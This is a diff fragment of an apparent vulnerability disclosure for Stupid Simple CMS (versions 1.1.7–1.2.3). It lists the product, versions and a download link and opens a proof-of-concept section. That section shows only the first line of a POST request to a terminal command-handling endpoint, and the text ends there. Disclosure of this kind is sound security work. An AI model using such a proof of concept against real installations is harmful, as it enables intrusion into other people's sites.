@@ -1,6 +1,9 @@
 product： Stupid Simple CMS ( Blogger )
+
 version：Version 1.1.7 - Version 1.2.3
+
 Download link： https://github.com/codelyfe/Stupid-Simple-CMS/releases/tag/v1.2.3
+
 ## POC:
 ```shell
 POST http://localhost/terminal/handle-command.php HTTP/1.1
